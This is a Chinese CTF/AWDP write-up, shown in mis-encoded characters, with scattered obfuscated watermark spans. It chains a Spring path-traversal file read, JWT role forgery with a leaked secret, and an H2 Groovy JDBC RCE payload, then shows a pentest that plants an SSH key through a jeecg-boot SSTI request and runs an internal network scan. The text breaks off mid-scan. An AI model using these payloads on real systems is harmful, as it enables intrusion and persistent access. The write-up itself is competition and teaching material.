<p>ç”±äº Windows å’Œ Linux å¯¹ Path çš„å¤„ç†ä¸åŒï¼Œ<span class="hexo-wm">ğ¬â€‹ğŸ¯ven.â€Ñ•ğ¢â€Œï»¿ï½”eâ€Œ</span>è¿™é‡Œä½¿ç”¨ç±» Linux ç¯å¢ƒè¿›è¡Œå¤ç°</p>
<p>åœ¨ <code>PathResourceLookupFunction#apply</code> ä¸‹æ–­ç‚¹<br><img src="image-5.png" alt="image-5.png"><br>é¦–å…ˆä½¿ç”¨é™æ€èµ„æºè·¯ç”± Pattern è¿›è¡ŒåŒ¹é…ï¼Œç•™ä¸‹å‰©ä½™çš„ Path éƒ¨åˆ†ï¼Œæ¥ç€å¯¹å…¶è¿›è¡Œä¸€æ¬¡ URL decode å¾—åˆ° <code>////../////../opt/ota.jar</code>ï¼Œæ¥ç€è¿›å…¥ isInvalidPath åˆ¤æ–­ï¼š<br><img src="image-6.png" alt="image-6.png"><br>å¯ä»¥çœ‹åˆ°ç»è¿‡ <code>StringUtils.cleanPath</code> å¤„ç†ååŸæ¥çš„ Path å˜ä¸ºäº† <code>//////opt/ota.jar</code>ï¼Œè¿™é‡ŒæŸ¥çœ‹ä¸€ä¸‹ cleanPath çš„å…·ä½“é€»è¾‘ï¼š<br><img src="image-7.png" alt="image-7.png"><br>ç”±äºä½¿ç”¨ <code>/</code> ä½œä¸ºåˆ†éš”ç¬¦å¯¹è·¯å¾„è¿›è¡Œ normalize åŒ–å¯¼è‡´äº§ç”Ÿäº†å¤šä¸ªç©ºè·¯å¾„å…ƒç´ ï¼Œä½¿å¾—è¯¥è·¯å¾„åœ¨è¢«å¤„ç†æ—¶æ¶ˆé™¤äº†ç”¨äºè·¯å¾„ç©¿è¶Šçš„ <span class="hexo-wm">sâ€3â…´ğğ˜¯â€¤â€Œâ€‹sï½‰â€Œâ€Œğ­ğâ€Œâ€Œ</span>Payloadï¼Œæœ€ç»ˆé€šè¿‡ isInvalidPath æ£€æµ‹<br><img src="image-8.png" alt="image-8.png"><br>æœ€ç»ˆè¯¥ Path å’Œé™æ€æ–‡ä»¶è·¯å¾„æ‹¼æ¥åå®ç°äº†ç›®å½•ç©¿è¶Šèƒ½å¤ŸæˆåŠŸè¯»å–æ–‡ä»¶èµ„æº</p>
<h5 id="2-h2-database-JDBC-RCE"><a href="#2-h2-database-JDBC-RCE" class="headerlink" title="2. h2 database JDBC RCE"></a>2. h2 database JDBC RCE</h5><p>æ³¨æ„åˆ°é¢˜ç›®ä½¿ç”¨ Java 17ï¼Œå¹¶åŒ…å« h2database å’Œ groovy ä¾èµ–ï¼š</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java.version</span><span class="token punctuation">&gt;</span></span>17<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java.version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.codehaus.groovy<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>groovy-sql<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.0.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.h2database<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>h2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.0.204<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span></code></pre>

<p>åŒæ—¶ h2database çš„ <span class="hexo-wm">ğ¬ï»¿ğŸ¯ğ˜·ğ˜¦nâ€¤â€â€ğ’”â…ˆâ€‹tğ˜¦â€â€‹</span>JDBC URL æ˜¯å¯æ§çš„ï¼š</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"/admin/init"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@ResponseBody</span>
<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">initH2Database</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">JdbcRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
      <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.h2.Driver"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token class-name">Connection</span> connection <span class="token operator">=</span> <span class="token class-name">DriverManager</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getJdbcUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span><span class="token function">getPassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      connection<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token string">"H2 database initialized successfully!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token string">"Failed to initialize H2 database: "</span> <span class="token operator">+</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> 
<span class="token punctuation">}</span></code></pre>

<p>æ ¹æ®ç»éªŒï¼Œæ­¤å¤„åº”è¯¥æ‰“ h2database JDBC RCEï¼Œä½¿ç”¨ <span class="hexo-wm">Ñ•â€ï»¿3â…´ğ˜¦ï½â€¢â€ŒÑ•ğ˜ªï»¿ğ’•eâ€</span>groovy å¼•æ“æ‰§è¡Œä»»æ„ Java å‘½ä»¤ï¼š</p>
<pre class="language-java" data-language="java"><code class="language-java">jdbc<span class="token operator">:</span>h2<span class="token operator">:</span>mem<span class="token operator">:</span>test<span class="token punctuation">;</span><span class="token constant">MODE</span><span class="token operator">=</span><span class="token class-name">MSSQLServer</span><span class="token punctuation">;</span>init<span class="token operator">=</span><span class="token constant">CREATE</span> <span class="token constant">ALIAS</span> <span class="token constant">T5</span> <span class="token constant">AS</span> '<span class="token annotation punctuation">@groovy.transform.ASTTest</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token punctuation">{</span> <span class="token keyword">assert</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>\"bash <span class="token operator">-</span>c <span class="token punctuation">{</span>echo<span class="token punctuation">,</span>cmd<span class="token punctuation">}</span><span class="token operator">|</span><span class="token punctuation">{</span>base64<span class="token punctuation">,</span><span class="token operator">-</span>d<span class="token punctuation">}</span><span class="token operator">|</span><span class="token punctuation">{</span>bash<span class="token punctuation">,</span><span class="token operator">-</span>i<span class="token punctuation">}</span>\"<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>def x'</code></pre>

<h5 id="3-JWT-Token-ä¼ªé€ "><a href="#3-JWT-Token-ä¼ªé€ " class="headerlink" title="3. JWT Token ä¼ªé€ "></a>3. JWT Token ä¼ªé€ </h5><p>ç”±äº Security ç­–ç•¥ä¸­é™åˆ¶äº†è§¦å‘ jdbc connect çš„è·¯ç”± <code>/admin/init</code> çš„è®¿é—®æƒé™ä¸º <code>SUPERADMIN</code>ï¼Œä¸”æ²¡æœ‰æä¾›è·å¾—è¯¥æƒé™çš„é€”å¾„ï¼Œ<span class="hexo-wm">ğ’”â€â‘¶ğ’—eï½âˆ™â€‹ğ˜´ï½‰â€â€‹tğ˜¦â€‹</span>å› æ­¤æ­¤å¤„éœ€è¦ä¼ªé€ ç”¨äºèº«ä»½è®¤è¯çš„ JWT Token</p>
<p>é¢˜ç›®ç»™å‡ºçš„é™„ä»¶ä¸­æ²¡æœ‰æä¾› jwt tokenï¼Œå› æ­¤éœ€è¦å…ˆé€šè¿‡ç¬¬ä¸€æ­¥çš„ç›®å½•éå†æ¼æ´è¯»å– ota.<span class="hexo-wm">êœ±â€‹â€3ğ˜·eğ˜¯â€¤ï»¿sğ¢ï»¿â€‹teâ€</span>jarï¼Œå†ä»ä¸­è·å¾— jwt secret è¿›è¡Œä¼ªé€ </p>
<p>é¦–å…ˆä½¿ç”¨é¢˜ç›®ä¸­ç»™å‡ºçš„ ADMIN è´¦å·ç™»å½•ï¼Œè·å¾— <span class="hexo-wm">Ñ•ï»¿â€‹ğŸ¯ğ¯â„¯ğ§Â·â€Œğ˜´â…ˆï»¿ğ˜µâ„®â€‹</span>ADMIN çš„ JWT Tokenï¼š</p>
<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
  <span class="token property">"sub"</span><span class="token operator">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>
  <span class="token property">"roles"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token string">"ROLE_ADMIN"</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token property">"iat"</span><span class="token operator">:</span> xxxx<span class="token punctuation">,</span>
  <span class="token property">"exp"</span><span class="token operator">:</span> xxxx
<span class="token punctuation">}</span></code></pre>
<p>å°†å…¶ä¿®æ”¹ä¸ºä»¥ä¸‹å†…å®¹å¹¶é‡æ–°ä½¿ç”¨ jwt <span class="hexo-wm">sï»¿ï»¿ğŸ¯â…´ğ˜¦ğ§âˆ™â€Œğ˜´iâ€tğâ€‹â€Œ</span>secret ç­¾åå³å¯ç»•è¿‡</p>
<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
  <span class="token property">"sub"</span><span class="token operator">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>
  <span class="token property">"roles"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token string">"ROLE_SUPERADMIN"</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token property">"iat"</span><span class="token operator">:</span> xxxx<span class="token punctuation">,</span>
  <span class="token property">"exp"</span><span class="token operator">:</span> xxxx
<span class="token punctuation">}</span></code></pre>

<h4 id="Fix-2"><a href="#Fix-2" class="headerlink" title="Fix"></a>Fix</h4><p>æŠŠä¾èµ–é‡Œçš„ spring-parent ä» 3.<span class="hexo-wm">ğ¬â€3â…´ï½…ğ’â€¤â€Œğ˜€ğ¢â€‹ï½”ï½…â€Œï»¿</span>3.3 æ¢åˆ° 3.3.4ï¼š</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>spring-boot.version</span><span class="token punctuation">&gt;</span></span>3.3.3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>spring-boot.version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">&gt;</span></span></code></pre>
<p>å°†å…¶ä¿®æ”¹ä¸ºï¼š</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>spring-boot.version</span><span class="token punctuation">&gt;</span></span>3.3.4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>spring-boot.version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">&gt;</span></span></code></pre>
<p><img src="image-9.png" alt="image-9.png"><br>å¯ä»¥çœ‹åˆ°ï¼Œä¿®å¤åçš„<span class="hexo-wm">ğ¬ï»¿Â³ğ¯eğ’ï¼ï»¿êœ±iâ€â€Œï½”eï»¿</span>ç‰ˆæœ¬æ·»åŠ äº† <code>isInvalidEncodedInputPath</code> æ–¹æ³•ç”¨æ¥è¿‡æ»¤è¯¥ç»•è¿‡åœºæ™¯ï¼Œå…¶ä¸­processPath æ–¹æ³•å¯¹ç¬¬ä¸€ä¸ªå‰å¯¼ <code>/</code> åçš„æ— æ•ˆå­—ç¬¦è¿›è¡Œäº†åˆ é™¤ï¼ŒåŒæ—¶å¯¹è¿ç»­çš„é‡å¤ <code>/</code> è¿›è¡Œäº†å¤„ç†ï¼Œå°†å…¶æ¢å¤ä¸ºå•ä¸ª <code>/</code>ï¼Œä»è€Œå®ç°äº†æ¼æ´ä¿®å¤</p>
<blockquote>
<p>è¿™é‡Œå¦‚æœåªä¿®å¤ç”¨äºè§¦å‘ h2 database RCE <span class="hexo-wm">ğ¬â€â‘¶ğ¯ğnÂ·ï»¿â€ŒÑ•ï½‰â€‹tï½…â€â€Œ</span>çš„éƒ¨åˆ†åˆ™æ— æ³•é€šè¿‡ checkï¼Œä¾ç„¶æ˜¯ exp åˆ©ç”¨æˆåŠŸï¼Œä½†æ˜¯å¦‚æœåªä¿®å¤ Spring ç›®å½•éå†æ¼æ´åˆ™å¯ä»¥é€šè¿‡ checkï¼ŒçŒœæµ‹å¯èƒ½æ˜¯ <span class="hexo-wm">êœ±â€â€â‘¶ğ’—ğ˜¦ğ˜¯.ï»¿â€‹ğ’”â…ˆâ€‹ï»¿ğ˜µeâ€‹ï»¿</span>checker çš„ç¼–å†™æ˜¯å‡è®¾äº†æå‰çŸ¥é“ flag çš„æ–‡ä»¶åï¼Œç›´æ¥é€šè¿‡ç›®å½•éå†è·å¾—çš„ Flag</p>
</blockquote>
<h4 id="Break-1"><a href="#Break-1" class="headerlink" title="Break"></a>Break</h4><p>é¦–å…ˆåˆ©ç”¨ç›®å½•éå†æ¼æ´<span class="hexo-wm">ğ’”â€Œï»¿â‘¶ğ¯â„¯nâ€¤â€Œğ˜€iâ€Œâ€‹tï½…ï»¿</span>æ‹¿åˆ° jar åŒ…ï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> /static/%2f/%2f/%2e%2e/%2f/%2f/%2e%2e/opt/ota.jar</code></pre>

<p>ç„¶åä» jar <span class="hexo-wm">sï»¿ï»¿ğŸ¯veğ˜¯Â·â€â€ğ¬â…ˆï»¿teâ€</span>åŒ…ä¸­æ‹¿åˆ° jwt secretï¼š</p>
<pre class="language-none"><code class="language-none">jwt.secret=b3d5f4a7c1e9b2a8d7f6c3e2a1b0d9c8e5f4b3a2d1c0b9a8f7e6d5c4b3a2e1f0</code></pre>

<p>ç„¶åæ„é€ ä¸€ä¸ªSUPE<span class="hexo-wm">Ñ•â€‹ï»¿ğŸ¯ğ¯enÂ·â€ğ’”ğ¢â€‹â€‹ğ­ï½…ï»¿</span>RADMIN token</p>
<pre class="language-none"><code class="language-none">eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGVzIjpbIlJPTEVfU1VQRVJBRE1JTiJdLCJpYXQiOjE3NTI5ODgyNjcsImV4cCI6MTc1Mjk4OTEzMX0.Z6-BgAkWSIOGqGx85f96Gt2XW7MoPhYQCxDVJj5LgnNGCyjEf85yqkmU9gb5-ii3UNS744eFcUr9S1_jBHTg2g</code></pre>

<p>æœ€åæ‰“ h2 <span class="hexo-wm">ğ˜€â€ŒğŸ¯ğ’—â„¯ï½âˆ™ï»¿ğ˜€iâ€‹â€ğ’•â„®â€Œâ€Œ</span>groovy rce</p>
<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token property">"jdbcUrl"</span><span class="token operator">:</span> <span class="token string">"jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '@groovy.transform.ASTTest(value={ assert java.lang.Runtime.getRuntime().exec(\"bash -c {echo,cmd}|{base64,-d}|{bash,-i}\")})def x'"</span><span class="token punctuation">,</span>
    <span class="token property">"username"</span><span class="token operator">:</span> <span class="token string">"sa"</span><span class="token punctuation">,</span>
    <span class="token property">"password"</span><span class="token operator">:</span> <span class="token string">"123123"</span>
<span class="token punctuation">}</span></code></pre>

<blockquote>
<p>ä¹Ÿç®—æ˜¯æ‹¿äº†ä¸ªå›½èµ›çš„äºŒè¡€ã€‚å› ä¸ºæœ¬åœ°æ²¡å­˜è¿™ä¸ª Spring çš„ CVEï¼Œè€Œä¸”åªæœ‰ Windows ç¯å¢ƒï¼ŒWindows é‡Œéšä¾¿å†™ä¸ª URL Encoded <span class="hexo-wm">êœ±ï»¿â€‹â‘¶ğ’—ï½…nÂ·â€â€êœ±ğ¢â€Œâ€teï»¿</span>çš„ç©¿è¶Šéƒ½èƒ½å®ç°ä»»è¯»ï¼Œè€Œ Linux å› ä¸º Path å¤„ç†ä¸åŒè€Œå®ç°ä¸äº†ï¼Œæ‰€ä»¥åªèƒ½çœ‹æºç æ”¹ Jar åŒ…é‡Œçš„åº“ä»£ç æ¥ç”¨ System.out.println åœ¨ Linux çš„ Docker é‡Œè°ƒè¯• Payload è°ƒäº†åŠå¤©ã€‚ä¸è¿‡è¿˜å¥½è¿™é¢˜æœ€åè§£ä¸å¤šï¼ˆåº”è¯¥æ˜¯AWDP Webé‡Œè§£æœ€å°‘åˆ†æœ€é«˜çš„ä¸€é¢˜ï¼‰ï¼Œé è¿™é¢˜çš„ Break å’Œ Fix æ‹¿äº†å¿« 1000 åˆ†ï¼Œä½†ä¹Ÿå¯¼è‡´å‰©ä¸‹ä¸¤ä¸ª Web åªåšäº† Fix æ¥ä¸åŠçœ‹ Break äº†ã€‚</p>
</blockquote>
<h2 id="Pentest"><a href="#Pentest" class="headerlink" title="Pentest"></a>Pentest</h2><h3 id="1-web01"><a href="#1-web01" class="headerlink" title="1. web01"></a>1. web01</h3><p>æ‰“å¼€åæ˜¯ä¸€ä¸ª <span class="hexo-wm">ğ˜€ï»¿â€ğŸ¯ğ’—ğğ§â€¤ï»¿â€Œğ¬â…ˆï»¿â€‹ğ­ğâ€‹</span>FinancePro ERP</p>
<p><img src="image-10.png" alt="image-10.png"></p>
<p>80ç«¯å£æ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œ8081ç«¯å£æœ‰ä¸ª <span class="hexo-wm">ğ˜€â€‹â€ŒÂ³ğ’—ï½…nÂ·â€‹ï»¿sï½‰â€ğ˜µğâ€‹â€Œ</span>jeecg-boot</p>
<p><img src="image-11.png" alt="image-11.png"></p>
<p>jeecg-boot å­˜åœ¨ queryFieldBySql æ¥å£RCEæ¼æ´ï¼ˆCVE-2023-<span class="hexo-wm">ğ¬ï»¿â€Œ3â…´ï½…ğ’.â€Œâ€‹sğ˜ªâ€ğ’•â„®â€</span>4450ï¼‰ï¼Œé€šè¿‡ SSTI æ¨¡æ¿æ¸²æŸ“èƒ½å¤Ÿæ‰“å›æ˜¾ RCEï¼Œç›´æ¥æ„é€  Payload å†™å…¥ SSH Key</p>
<pre class="language-json" data-language="json"><code class="language-json">POST /jmreport/queryFieldBySql HTTP/<span class="token number">1.1</span>
Host<span class="token operator">:</span> xxxx
Origin<span class="token operator">:</span> xxxx
User-Agent<span class="token operator">:</span> Mozilla/<span class="token number">5.0</span> (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/<span class="token number">537.36</span> (KHTML<span class="token punctuation">,</span> like Gecko) Chrome/<span class="token number">115.0</span>.<span class="token number">0.0</span> Safari/<span class="token number">537.36</span>
Accept<span class="token operator">:</span> *<span class="token comment">/*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json
Content-Length: 294

{"sql":"select 'result:&lt;#assign ex=\"freemarker.template.utility.Execute\"?new()&gt; ${ ex(\"bash -c {echo,ZWNobyAic3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSURkc1JERG1yOFltWVd5SHFBbnBEQjQ2RzNGOStucjZ6aFB4emZPUVRKSisiID4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXM=}|{base64,-d}|{bash,-i}\") }' "}</span></code></pre>

<p>ssh ç™»å½•å<span class="hexo-wm">ğ˜´ï»¿ï»¿ğŸ¯ğ’—â„¯ğ§âˆ™â€â€‹Ñ•â…ˆâ€‹â€Œtâ„®â€‹</span>çœ‹ç½‘å¡é…ç½®ï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@web01:~<span class="token comment"># ifconfig</span>
docker0: <span class="token assign-left variable">flags</span><span class="token operator">=</span><span class="token number">416</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>UP,BROADCAST,RUNNING,MULTICAST<span class="token operator">&gt;</span>  mtu <span class="token number">1500</span>
        inet <span class="token number">172.17</span>.0.1  netmask <span class="token number">255.255</span>.0.0  broadcast <span class="token number">172.17</span>.255.255
        inet6 fe80::42:b6ff:fec8:3122  prefixlen <span class="token number">64</span>  scopeid 0x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>link<span class="token operator">&gt;</span>
        ether 02:42:b6:c8:31:22  txqueuelen <span class="token number">0</span>  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span>
        RX packets <span class="token number">120</span>  bytes <span class="token number">5749</span> <span class="token punctuation">(</span><span class="token number">5.7</span> KB<span class="token punctuation">)</span>
        RX errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span>
        TX packets <span class="token number">128</span>  bytes <span class="token number">8133</span> <span class="token punctuation">(</span><span class="token number">8.1</span> KB<span class="token punctuation">)</span>
        TX errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span>

eth0: <span class="token assign-left variable">flags</span><span class="token operator">=</span><span class="token number">416</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>UP,BROADCAST,RUNNING,MULTICAST<span class="token operator">&gt;</span>  mtu <span class="token number">1500</span>
        inet <span class="token number">172.22</span>.10.22  netmask <span class="token number">255.255</span>.255.0  broadcast <span class="token number">172.22</span>.10.255
        inet6 fe80::216:3eff:fe10:869  prefixlen <span class="token number">64</span>  scopeid 0x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>link<span class="token operator">&gt;</span>
        ether 00:16:3e:10:08:69  txqueuelen <span class="token number">1000</span>  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span>
        RX packets <span class="token number">7518</span>  bytes <span class="token number">9325909</span> <span class="token punctuation">(</span><span class="token number">9.3</span> MB<span class="token punctuation">)</span>
        RX errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span>
        TX packets <span class="token number">4445</span>  bytes <span class="token number">7358439</span> <span class="token punctuation">(</span><span class="token number">7.3</span> MB<span class="token punctuation">)</span>
        TX errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span>

lo: <span class="token assign-left variable">flags</span><span class="token operator">=</span><span class="token number">7</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>UP,LOOPBACK,RUNNING<span class="token operator">&gt;</span>  mtu <span class="token number">65536</span>
        inet <span class="token number">127.0</span>.0.1  netmask <span class="token number">255.0</span>.0.0
        inet6 ::1  prefixlen <span class="token number">128</span>  scopeid 0x1<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>host<span class="token operator">&gt;</span>
        loop  txqueuelen <span class="token number">1000</span>  <span class="token punctuation">(</span>Local Loopback<span class="token punctuation">)</span>
        RX packets <span class="token number">4596</span>  bytes <span class="token number">1591117</span> <span class="token punctuation">(</span><span class="token number">1.5</span> MB<span class="token punctuation">)</span>
        RX errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span>
        TX packets <span class="token number">4596</span>  bytes <span class="token number">1591117</span> <span class="token punctuation">(</span><span class="token number">1.5</span> MB<span class="token punctuation">)</span>
        TX errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span>

vetha13ce1e: <span class="token assign-left variable">flags</span><span class="token operator">=</span><span class="token number">416</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>UP,BROADCAST,RUNNING,MULTICAST<span class="token operator">&gt;</span>  mtu <span class="token number">1500</span>
        inet6 fe80::e42f:6cff:fe10:cd7d  prefixlen <span class="token number">64</span>  scopeid 0x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>link<span class="token operator">&gt;</span>
        ether e6:2f:6c:10:cd:7d  txqueuelen <span class="token number">0</span>  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span>
        RX packets <span class="token number">120</span>  bytes <span class="token number">7429</span> <span class="token punctuation">(</span><span class="token number">7.4</span> KB<span class="token punctuation">)</span>
        RX errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span>
        TX packets <span class="token number">141</span>  bytes <span class="token number">9139</span> <span class="token punctuation">(</span><span class="token number">9.1</span> KB<span class="token punctuation">)</span>
        TX errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span></code></pre>

<p>Fscan æ‰«å†…ç½‘ç½‘æ®µï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@web01:~<span class="token comment"># ./FScan_2.0.1_linux_x64 -h 172.22.10.0/24</span>
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚    ___                              _        â”‚
â”‚   / _ <span class="token punctuation">\</span>     ___  ___ _ __ __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __    â”‚
â”‚  / /_<span class="token punctuation">\</span>/____/ __<span class="token operator">|</span>/ __<span class="token operator">|</span> '__/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ /    â”‚
â”‚ / /_<span class="token punctuation">\</span><span class="token punctuation">\</span>_____<span class="token punctuation">\</span>__ <span class="token punctuation">\</span> <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span>     â”‚
â”‚ <span class="token punctuation">\</span>____/     <span class="token operator">|</span>___/<span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>_<span class="token punctuation">\</span>    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
      Fscan Version: <span class="token number">2.0</span>.1

<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     å·²é€‰æ‹©æœåŠ¡æ‰«ææ¨¡å¼
